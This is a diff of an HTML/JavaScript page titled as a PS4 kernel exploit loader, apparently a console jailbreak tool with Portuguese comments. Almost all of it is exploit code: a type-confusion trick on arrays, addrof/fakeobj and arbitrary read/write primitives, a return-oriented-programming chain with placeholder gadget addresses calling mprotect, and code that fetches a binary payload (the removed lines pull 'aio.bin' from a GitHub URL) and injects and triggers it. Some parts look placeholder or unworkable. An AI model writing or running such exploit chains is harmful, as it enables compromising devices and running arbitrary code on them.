@@ -2,27 +2,28 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>PS4 JIT → ROP → Shellcode Real (.bin)</title>
+  <title>PS4 Kernel Exploit Loader</title>
   <style>
     body { background: #000; color: #0f0; font-family: monospace; padding: 10px; white-space: pre-wrap; }
     #log { max-height: 80vh; overflow-y: auto; }
   </style>
 </head>
 <body>
-  <h1>Exploit PS4: JIT → ROP → Shellcode from .bin</h1>
+  <h1>Loader PS4 Kernel Exploit</h1>
   <div id="log">inicializando…</div>
   <script>
-    const logEl = document.getElementById('log'); let logData = "";
-    function log(msg) { logData += msg + "\n"; logEl.textContent = logData; logEl.scrollTop = logEl.scrollHeight; }
+    const logEl = document.getElementById('log');
+    function log(msg) {
+      logEl.textContent += msg + "\n";
+      logEl.scrollTop = logEl.scrollHeight;
+    }
 
-    // float ↔ int primitives
-    const buf = new ArrayBuffer(8);
-    const f64 = new Float64Array(buf);
-    const u32 = new Uint32Array(buf);
+    // float↔int primitives
+    const buf = new ArrayBuffer(8), f64 = new Float64Array(buf), u32 = new Uint32Array(buf);
     function f2i(f){ f64[0]=f; return BigInt(u32[0]) | (BigInt(u32[1])<<32n); }
     function i2f(i){ u32[0]=Number(i & 0xffffffffn); u32[1]=Number(i>>32n); return f64[0]; }
 
-    // Type-confusion gadget
+    // type-confusion gadget
     function makeCorruptArray() {
       let arr=[1.1,1.1,1.1];
       let trigger={ valueOf(){ arr.length=1; return 3; } };
@@ -31,50 +32,58 @@
 
     let corrupt, addrof, fakeobj, arb_read, arb_write;
     function setupPrimitives() {
-      log('[+] setupPrimitives()');
-      corrupt = makeCorruptArray(); log('    corrupt[1]='+corrupt[1]);
-      let leak=f2i(corrupt[1]); log('    backing leak=0x'+leak.toString(16));
-      let buf2=new ArrayBuffer(0x2000), f2=new Float64Array(buf2);
-      corrupt[1] = i2f(leak);
-      addrof = obj=>{ f2[0]=obj; return f2i(corrupt[1]); };
-      fakeobj = addr=>{ corrupt[1]=i2f(addr); return new Float64Array(buf2)[0]; };
-      arb_read = addr=>{ corrupt[1]=i2f(addr); return f2i(f2[1]); };
-      arb_write = (addr,val)=>{ corrupt[1]=i2f(addr); f2[1]=i2f(val); };
-      log('    primitives ready');
+      log("[+] setupPrimitives()");
+      corrupt = makeCorruptArray();
+      let leak=f2i(corrupt[1]); log("    leak=0x"+leak.toString(16));
+      let vb=new ArrayBuffer(0x2000), vf=new Float64Array(vb);
+      corrupt[1]=i2f(leak);
+      addrof=obj=>{ vf[0]=obj; return f2i(corrupt[1]); };
+      fakeobj=addr=>{ corrupt[1]=i2f(addr); return new Float64Array(vb)[0]; };
+      arb_read=addr=>{ corrupt[1]=i2f(addr); return f2i(vf[1]); };
+      arb_write=(addr,val)=>{ corrupt[1]=i2f(addr); vf[1]=i2f(val); };
+      log("    primitives ready");
     }
 
-    let shellcodeAddr;
+    let shellcodeAddr, rop;
     function buildROP(sc_buf) {
-      log('[+] buildROP()'); shellcodeAddr=f2i(corrupt[1]); log('    scbuf @0x'+shellcodeAddr.toString(16));
-      // placeholder gadgets
+      log("[+] buildROP()");
+      shellcodeAddr=f2i(corrupt[1]); log("    scbuf @0x"+shellcodeAddr.toString(16));
+      // ← substitua por gadgets reais leakados no PS4
       let pop_rdi=0x10001000n, pop_rsi=0x10002000n, pop_rdx=0x10003000n, mprot=0x10004000n;
-      let rop=[pop_rdi,shellcodeAddr,pop_rsi,0x1000n,pop_rdx,7n,mprot,shellcodeAddr];
+      rop=[ pop_rdi,shellcodeAddr,pop_rsi,0x1000n,pop_rdx,7n,mprot,shellcodeAddr ];
       let dv=new DataView(sc_buf);
       for(let i=0;i<rop.length;i++) dv.setBigUint64(i*8,rop[i],true);
-      log('    ROPChain written ('+rop.length+' entries)');
-      return rop;
+      log("    ROPChain written");
+      return rop.length;
     }
 
-    async function injectAndRun() {
-      log('[+] injectAndRun()');
+    async function loadAndTrigger() {
+      log("[+] loadAndTrigger()");
       try {
-        log('[+] fetching .bin...');
-        let r=await fetch('https://raw.githubusercontent.com/NICKZZIN/SITEX/main/aio.bin'); if(!r.ok) throw new Error(r.status);
-        let payload=new Uint8Array(await r.arrayBuffer()); log('    .bin size='+payload.length+' bytes');
+        let res=await fetch("doublefree_test.bin");
+        if(!res.ok) throw new Error(res.status);
+        let payload=new Uint8Array(await res.arrayBuffer());
+        log("    bin size="+payload.length+" bytes");
 
-        // allocate buffer for ROP + payload
-        let sc_buf=new ArrayBuffer(8*8 + payload.length); // 8 entries in ROP
-        let rop = buildROP(sc_buf);
+        // aloca buffer para ROPChain + payload
+        let sc_buf=new ArrayBuffer(8*8 + payload.length);
+        let offset=buildROP(sc_buf)*8;
         let dv=new DataView(sc_buf);
-        for(let i=0;i<payload.length;i++) dv.setUint8(rop.length*8 + i, payload[i]);
-        log('    .bin injected');
+        for(let i=0;i<payload.length;i++) dv.setUint8(offset+i,payload[i]);
+        log("    bin injected, triggering...");
 
-        log('[+] triggering ROP→shellcode');
+        // pivot to ROPChain → payload
         fakeobj(shellcodeAddr);
-      } catch(e) { log('!!! inject error: '+e); }
+      } catch(e) {
+        log("!!! error: "+e);
+      }
     }
 
-    setTimeout(()=>{ log('=== Exploit start ==='); setupPrimitives(); injectAndRun().then(()=>log('=== done ===')); },1000);
+    setTimeout(()=>{
+      log("=== Exploit start ===");
+      setupPrimitives();
+      loadAndTrigger().then(()=>log("=== done ==="));
+    },1000);
   </script>
 </body>
 </html>
